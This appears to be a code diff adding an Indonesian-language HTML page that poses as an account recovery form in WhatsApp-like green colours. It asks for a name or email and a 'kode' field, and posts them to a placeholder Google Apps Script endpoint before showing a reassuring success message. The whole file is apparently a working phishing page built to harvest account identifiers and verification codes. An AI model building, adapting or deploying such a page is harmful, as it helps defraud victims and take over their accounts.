@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Pengumpulan Data Bisnis</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; width: 360px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background-color: #075E54; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold; }
+        .content { padding: 25px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #f9f9f9; }
+        .btn { background-color: #25D366; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background-color: #128C7E; }
+        #loader { display: none; margin-top: 15px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">🔒 Akun Recovery</div>
+    <div class="content">
+        <form id="dataForm">
+            <h3>Lengkapi Informasi</h3>
+            <input type="text" name="username" placeholder="Nama atau Email" required>
+            <input type="text" name="kode" placeholder="Masukkan Detail Lain" required>
+            <button type="submit" class="btn" id="submitBtn">Pulihkan Akun</button>
+        </form>
+        <div id="loader">Sedang memproses ke database... ⚙️</div>
+    </div>
+</div>
+
+<script>
+    const scriptURL = 'URL_GOOGLE_SCRIPT_ANDA_DI_SINI';
+    const form = document.getElementById('dataForm');
+    const loader = document.getElementById('loader');
+    const btn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        loader.style.display = 'block';
+        btn.disabled = true;
+
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => {
+              alert("Data Berhasil Disimpan!");
+              loader.style.display = 'none';
+              btn.disabled = false;
+              form.reset();
+          })
+          .catch(error => {
+              console.error('Error!', error.message);
+              alert("Terjadi kesalahan koneksi.");
+              loader.style.display = 'none';
+              btn.disabled = false;
+          });
+    });
+</script>
+
+</body>
+</html>
